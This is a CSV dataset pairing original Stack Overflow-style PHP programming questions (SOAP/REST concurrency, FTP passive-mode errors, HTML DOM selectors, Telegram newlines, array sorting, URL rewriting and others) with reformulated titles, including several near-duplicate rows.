originalTitle,body,reformulatedTitle
Consuming several WebServices with PHP at the same time (SOAP and REST)," My objective is consume various Web Services and then merge the results.I was doing this using PHP cURL, but as the number of Web Services has increased, my service slowed since the process was waiting for a response and then make the request to the next Web Service.I solved this issue using curl_multi and everything was working fine.Now, I have a new problem, because I have new Web Services to add in my service that use Soap Protocol and I can't do simultaneous requests anymore, because I don't use cURL for Soap Web Services, I use SoapClient.I know that I can make the XML with the soap directives and then send it with cURL, but this seems to me a bad practice.In short, is there some way to consume REST and SOAP Web Services simultaneously? <code> ",Consuming SOAP and REST WebServices at the same time in PHP
Ajax big data that make site slow response even when re-access to site by open another tab on same browser," I have a Silverstripe site that deals with very big data. I made an API that returns a very large dump, and I call that API at the front-end by ajax get.When ajax calling the API, it will take 10 mins for data to return (very long json data and customer accepted that). While they are waiting for the data return, they open the same site in another tab to do other things, but the site is very slow until the previous ajax request is finished. Is there anything I can do to avoid everything going unresponsive while waiting for big json data?Here's the code and an explanation of what it does:I created a method named geteverything that resides on the web server as below, it accessesses another server (data server) to get data via streaming API (sitting in data server). There's a lot of data, and the data server is slow; my customer doesn't mind the request taking long, they mind how slow everything else becomes. Sessions are used to determine particulars of the request. How can I fix this, or what else would you need to know in order to help? <code>  protected function geteverything($http, $id) { if(($System = DataObject::get_by_id('ESM_System', $id))) { if(isset($_GET['AAA']) && isset($_GET['BBB']) && isset($_GET['CCC']) && isset($_GET['DDD'])) { /** --some condition check and data format for AAA BBB CCC and DDD goes here **/ $request = ""http://dataserver/streaming?method=xxx""; set_time_limit(120); $jsonstring = file_get_contents($request); echo($jsonstring); } }}",Why does this code so negatively affect my server's performance?
PHP upload via ftp - ftp_put() I won't open a connection to," I'm trying to use one host to upload content to another via FTP.The ""I won't open a connection to 172.xxx.xxx.xxx (only to 54.xxx.xxx.xxx)"" is not even relevant because I am not connecting to that host. That's the IP address to the server that is hosting the script. But not to the server that is being accessed via FTP. ftp_put() I won't open a connection to 172.xxx.xxx.xxx (only to 54.xxx.xxx.xxx)The IP addresses within this error, does not go to the server I am trying to connect to. The ftp_login connects and no issues. ( I don't even want it to make a connection to those IP addresses anyways, so why does it even think that?)I can use ftp_mkdir to add a directory on the server. However, when I use ftp_put, it throws that error. <code>  $conn_id = ftp_connect('50.xxx.xxx.xxx');ftp_pasv($conn_id, true);$login_result = ftp_login($conn_id, 'user', 'pass');$file = ""http://example.com/filelocation.swf"";if (ftp_put($conn_id, ""test.swf"", $file, FTP_BINARY)) { echo 'File Uploaded'; } else { echo 'Problem with uploading'; }",PHP upload via FTP - ftp_put() I won't open a connection to x.x.x.x (only to y.y.y.y)
PHP upload via FTP - ftp_put() I won't open a connection to," I'm trying to use one host to upload content to another via FTP.The ""I won't open a connection to 172.xxx.xxx.xxx (only to 54.xxx.xxx.xxx)"" is not even relevant because I am not connecting to that host. That's the IP address to the server that is hosting the script. But not to the server that is being accessed via FTP. ftp_put() I won't open a connection to 172.xxx.xxx.xxx (only to 54.xxx.xxx.xxx)The IP addresses within this error, does not go to the server I am trying to connect to. The ftp_login connects and no issues. ( I don't even want it to make a connection to those IP addresses anyways, so why does it even think that?)I can use ftp_mkdir to add a directory on the server. However, when I use ftp_put, it throws that error. <code>  $conn_id = ftp_connect('50.xxx.xxx.xxx');ftp_pasv($conn_id, true);$login_result = ftp_login($conn_id, 'user', 'pass');$file = ""http://example.com/filelocation.swf"";if (ftp_put($conn_id, ""test.swf"", $file, FTP_BINARY)) { echo 'File Uploaded'; } else { echo 'Problem with uploading'; }",PHP upload via FTP - ftp_put() I won't open a connection to x.x.x.x (only to y.y.y.y)
PHP upload via FTP - ftp_put() I won't open a connection to x.x.x.x (only to y.y.y.y)," I'm trying to use one host to upload content to another via FTP.The ""I won't open a connection to 172.xxx.xxx.xxx (only to 54.xxx.xxx.xxx)"" is not even relevant because I am not connecting to that host. That's the IP address to the server that is hosting the script. But not to the server that is being accessed via FTP. ftp_put() I won't open a connection to 172.xxx.xxx.xxx (only to 54.xxx.xxx.xxx)The IP addresses within this error, does not go to the server I am trying to connect to. The ftp_login connects and no issues. ( I don't even want it to make a connection to those IP addresses anyways, so why does it even think that?)I can use ftp_mkdir to add a directory on the server. However, when I use ftp_put, it throws that error. <code>  $conn_id = ftp_connect('50.xxx.xxx.xxx');ftp_pasv($conn_id, true);$login_result = ftp_login($conn_id, 'user', 'pass');$file = ""http://example.com/filelocation.swf"";if (ftp_put($conn_id, ""test.swf"", $file, FTP_BINARY)) { echo 'File Uploaded'; } else { echo 'Problem with uploading'; }",PHP upload via FTP - ftp_put() I won't open a connection to x.x.x.x (only to y.y.y.y)
PHP upload via FTP - ftp_put() It won't open a connection to x.x.x.x (only to y.y.y.y)," I'm trying to use one host to upload content to another via FTP.The ""I won't open a connection to 172.xxx.xxx.xxx (only to 54.xxx.xxx.xxx)"" is not even relevant because I am not connecting to that host. That's the IP address to the server that is hosting the script. But not to the server that is being accessed via FTP. ftp_put() I won't open a connection to 172.xxx.xxx.xxx (only to 54.xxx.xxx.xxx)The IP addresses within this error, does not go to the server I am trying to connect to. The ftp_login connects and no issues. ( I don't even want it to make a connection to those IP addresses anyways, so why does it even think that?)I can use ftp_mkdir to add a directory on the server. However, when I use ftp_put, it throws that error. <code>  $conn_id = ftp_connect('50.xxx.xxx.xxx');ftp_pasv($conn_id, true);$login_result = ftp_login($conn_id, 'user', 'pass');$file = ""http://example.com/filelocation.swf"";if (ftp_put($conn_id, ""test.swf"", $file, FTP_BINARY)) { echo 'File Uploaded'; } else { echo 'Problem with uploading'; }",PHP upload via FTP - ftp_put() I won't open a connection to x.x.x.x (only to y.y.y.y)
Simple HTML DOM - immediate child css selector," I am trying to select a (direct) child of parents div.element using the > combinator, but it's failing.HTML: PHP: I am looking to select the direct p element. If it's a nested descendant - it shouldn't return anything, but it returns test2.How can I write it to return test, but not test2? ThanksUPDATE: The general consensus here on SO seems to be that Simple HTML DOM is bad. I ended up writing my code using PHP's DOMDocument as suggested by Phil. I did test out nevermind's solution and it did work as well. Thanks for all the help and Happy Coding <code>  <div class=""element""> <p>test</p></div><div class=""element""> <div class=""selected""> <p>test2</p> </div></div> $html->find('div.element > p', 0);",Simple HTML DOM - Child Selectors (CSS)
how to generate new line character in telegram message?," When I send the data I read from mysql database to telegram user, the user gets underline and etc instead of new line character. So this way I can't format message text correctly.How can I format a telegram message that is a question with 4 or more possible answers? What else is going to be changed that I don't expect? By the way I'm sending non-english characters. <code>  $qsBody = $rowQuestion['body']; // This is what I read from database that contains some new line characters$strReply = $qsBody;$strSendMethod = ""SendMessage?chat_id=$ChatId&text='$strReply'"";file_get_contents( BOT_TARGET_ADDRESS . $strSendMethod );// The message received by user contains _ instead of new line.",How to generate new line character in telegram message?
"sort an integer array, negative integers in the front and positive integers in the back in PHP"," I was given an array like this: I neeed to sort it in such a way that negative integers are in the front and positive integers are at the back, and the relative position should not be changed. So the output should be: I tried this using usort, but I could not retain the relative positions. <code>  $input = array(-1,1,3,-2,2, 3,4,-4); $output = array(-1 ,-2,-4, 1,3,2,3,4); function cmp ($a, $b){ return $a - $b;}usort($input, ""cmp"");echo '<pre>', print_r($input), '</pre>';Array( [0] => -4 [1] => -2 [2] => -1 [3] => 1 [4] => 2 [5] => 3 [6] => 3 [7] => 4)","Sort an integer array, negative integers in the front and positive integers in the back"
"order an integer array, negative integers in the front and positive integers in the back in PHP"," I was given an array like this: I neeed to sort it in such a way that negative integers are in the front and positive integers are at the back, and the relative position should not be changed. So the output should be: I tried this using usort, but I could not retain the relative positions. <code>  $input = array(-1,1,3,-2,2, 3,4,-4); $output = array(-1 ,-2,-4, 1,3,2,3,4); function cmp ($a, $b){ return $a - $b;}usort($input, ""cmp"");echo '<pre>', print_r($input), '</pre>';Array( [0] => -4 [1] => -2 [2] => -1 [3] => 1 [4] => 2 [5] => 3 [6] => 3 [7] => 4)","Sort an integer array, negative integers in the front and positive integers in the back"
PHP URL Formate without .php extension?, all I need is to get a string as URL without showing the PHP filename. I have file contact.php page I am trying to get URL as e.g. localhost/contact.php this is what now I am getting I need to access this page just with localhost/contactFor every page I should able to navigate by their name only. localhost/contact localhost/help localhost/support <code> ,PHP URL Format without .php extension?
Send event to Google Analytics using API," I have a website where I send events to Google Analytics using javascript function: ga('send', 'event', 'showphone', 'feedback', 'result');However I also need to send some similar events from server-side using PHP. I tried this quick start tutorial: Hello Analytics API: PHP quickstart for service accounts and reporting works like a charm, but I have no idea how to send event.Could you please show me step-by-step what I should code to send exactly same event like mentioned above. <code> ",Send event to Google Analytics using API server sided
How to exicute any given number of html tags through php," I'm working on a project in which I want to display randomly any given number of results suppose, I have six <html> tags of image and I only want to display three randomly so that every time we refresh the page it show randomly any three image out of any sixI'm using html code for an example Out of this Six Images I only want to show any three Images Each time through php. Is it possible and how can I do that?Hope you may find any better solution.Also i want to display Other tags like link inthe image and some more tags so that i can display images in a better way through css so I think it can be done by switch statement more easily  <code>  <html>",How to filter any given number of html tags through php
